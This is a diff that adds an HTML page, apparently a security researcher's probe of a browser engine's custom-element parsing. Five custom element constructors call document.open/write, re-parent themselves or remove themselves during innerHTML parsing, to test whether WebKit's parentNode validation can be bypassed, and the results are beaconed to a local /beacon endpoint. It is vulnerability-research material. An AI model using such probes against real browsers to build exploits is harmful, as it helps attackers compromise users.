@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>CE Double-Parent / Microtask Bypass</title>
+</head>
+<body><pre id="out">CE double-parent / microtask bypass probe</pre>
+<script>
+/* V700: HTMLParser Custom Element double-parent / microtask bypass probe.
+ * Tests whether operations inside a custom element constructor (during
+ * fragment parsing) can bypass the post-construction parentNode validation
+ * at JSCustomElementInterface.cpp:173.
+ *
+ * Beacon prefix: V700-
+ */
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function bk(tag, body) {
+  var u = '/beacon/V700-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now();
+  try { new Image().src = u; } catch (e) {}
+}
+function bks(tag, body) {
+  var u = '/beacon/V700-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+function summarize(obj) {
+  try { return JSON.stringify(obj); } catch (e) { return String(obj); }
+}
+
+/* ---- Test 1: constructor calls document.open() ---- */
+function testDocOpen() {
+  var r = {};
+  try {
+    class DocOpenEl extends HTMLElement {
+      constructor() {
+        super();
+        try {
+          document.open();
+          document.write('<html><body>replaced-by-ce</body></html>');
+          document.close();
+          r.docOpen = 'success';
+        } catch (e) {
+          r.docOpen = 'err:' + e.constructor.name;
+        }
+      }
+    }
+    customElements.define('docopen-el', DocOpenEl);
+
+    var container = document.createElement('div');
+    document.documentElement.appendChild(container);
+    try {
+      container.innerHTML = '<docopen-el></docopen-el>';
+      r.innerHTML = 'ok';
+    } catch (e) {
+      r.innerHTML = 'err:' + e.constructor.name;
+    }
+    r.containerChildren = container.children.length;
+    r.firstChildTag = container.children[0] ? container.children[0].tagName : 'none';
+    r.bodyText = document.body ? document.body.textContent.slice(0, 60) : 'no-body';
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 2: constructor appends self to an alternate parent ---- */
+function testAltParent() {
+  var r = {};
+  try {
+    var altDiv = document.createElement('div');
+    altDiv.id = 'alt-parent';
+    document.documentElement.appendChild(altDiv);
+
+    var selfRef = null;
+    class AltParentEl extends HTMLElement {
+      constructor() {
+        super();
+        selfRef = this;
+        try {
+          altDiv.appendChild(this);
+          r.append = 'success';
+        } catch (e) {
+          r.append = 'err:' + e.constructor.name;
+        }
+      }
+    }
+    customElements.define('altparent-el', AltParentEl);
+
+    var container = document.createElement('div');
+    document.documentElement.appendChild(container);
+    try {
+      container.innerHTML = '<altparent-el></altparent-el>';
+      r.innerHTML = 'ok';
+    } catch (e) {
+      r.innerHTML = 'err:' + e.constructor.name;
+    }
+
+    if (selfRef) {
+      r.parentTag = selfRef.parentNode ? selfRef.parentNode.tagName : 'null';
+      r.parentId = selfRef.parentNode ? selfRef.parentNode.id : 'null';
+      r.inContainer = container.contains(selfRef);
+      r.inAlt = altDiv.contains(selfRef);
+      r.dual = (r.inContainer && r.inAlt) ? 1 : 0;
+    } else {
+      r.selfRef = 'null';
+    }
+    r.containerChildren = container.children.length;
+    r.altChildren = altDiv.children.length;
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 3: constructor removes self from parser-inserted parent ---- */
+function testRemoveSelf() {
+  var r = {};
+  try {
+    var selfRef = null;
+    class RemoveSelfEl extends HTMLElement {
+      constructor() {
+        super();
+        selfRef = this;
+        try {
+          // parentNode is set by parser before constructor? Try removing.
+          if (this.parentNode) this.parentNode.removeChild(this);
+          r.remove = 'had-parent';
+        } catch (e) {
+          r.remove = 'err:' + e.constructor.name;
+        }
+      }
+    }
+    customElements.define('removeself-el', RemoveSelfEl);
+
+    var container = document.createElement('div');
+    document.documentElement.appendChild(container);
+    try {
+      container.innerHTML = '<removeself-el></removeself-el>';
+      r.innerHTML = 'ok';
+    } catch (e) {
+      r.innerHTML = 'err:' + e.constructor.name;
+    }
+
+    if (selfRef) {
+      r.parentTag = selfRef.parentNode ? selfRef.parentNode.tagName : 'null';
+      r.inContainer = container.contains(selfRef);
+    } else {
+      r.selfRef = 'null';
+    }
+    r.containerChildren = container.children.length;
+    r.firstChildTag = container.children[0] ? container.children[0].tagName : 'none';
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 4: constructor does document.write() only ---- */
+function testDocWriteOnly() {
+  var r = {};
+  try {
+    class DocWriteEl extends HTMLElement {
+      constructor() {
+        super();
+        try {
+          document.write('<b>injected</b>');
+          r.docWrite = 'success';
+        } catch (e) {
+          r.docWrite = 'err:' + e.constructor.name;
+        }
+      }
+    }
+    customElements.define('docwrite-el', DocWriteEl);
+
+    var container = document.createElement('div');
+    document.documentElement.appendChild(container);
+    try {
+      container.innerHTML = '<docwrite-el></docwrite-el>';
+      r.innerHTML = 'ok';
+    } catch (e) {
+      r.innerHTML = 'err:' + e.constructor.name;
+    }
+    r.containerChildren = container.children.length;
+    r.bodyHTML = document.body ? document.body.innerHTML.slice(0, 100) : 'no-body';
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Test 5: CE constructor calls document.open() on iframe document ---- */
+function testIframeDocOpen() {
+  var r = {};
+  try {
+    var iframe = document.createElement('iframe');
+    document.documentElement.appendChild(iframe);
+    var iframeDoc = iframe.contentDocument;
+
+    class IframeDocOpenEl extends HTMLElement {
+      constructor() {
+        super();
+        try {
+          iframeDoc.open();
+          iframeDoc.write('<html><body>iframe-replaced</body></html>');
+          iframeDoc.close();
+          r.iframeDocOpen = 'success';
+        } catch (e) {
+          r.iframeDocOpen = 'err:' + e.constructor.name;
+        }
+      }
+    }
+    customElements.define('iframedocopen-el', IframeDocOpenEl);
+
+    var container = document.createElement('div');
+    document.documentElement.appendChild(container);
+    try {
+      container.innerHTML = '<iframedocopen-el></iframedocopen-el>';
+      r.innerHTML = 'ok';
+    } catch (e) {
+      r.innerHTML = 'err:' + e.constructor.name;
+    }
+    r.containerChildren = container.children.length;
+    r.firstChildTag = container.children[0] ? container.children[0].tagName : 'none';
+  } catch (e) {
+    r.fatal = e.constructor.name + ':' + String(e.message || '').slice(0, 80);
+  }
+  return r;
+}
+
+/* ---- Run all tests sequentially ---- */
+async function runAll() {
+  bks('BOOT', 'ce-double-parent-v1');
+  var tests = [
+    { name: 'DOCOPEN', fn: testDocOpen },
+    { name: 'ALTPARENT', fn: testAltParent },
+    { name: 'REMOVESELF', fn: testRemoveSelf },
+    { name: 'DOCWRITE', fn: testDocWriteOnly },
+    { name: 'IFRAMEDOCOPEN', fn: testIframeDocOpen }
+  ];
+  for (var i = 0; i < tests.length; i++) {
+    bks(tests[i].name + '-PRE', 'start');
+    try {
+      var result = tests[i].fn();
+      bks(tests[i].name, summarize(result));
+      say(tests[i].name + ': ' + summarize(result));
+    } catch (e) {
+      bks(tests[i].name + '-FATAL', e.constructor.name + ':' + String(e.message || '').slice(0, 80));
+      say(tests[i].name + ' FATAL: ' + e.constructor.name);
+    }
+    await new Promise(function (resolve) { setTimeout(resolve, 300); });
+  }
+  bks('DONE', 'all-' + tests.length);
+  say('DONE');
+}
+runAll();
+</script>
+</body>
+</html>
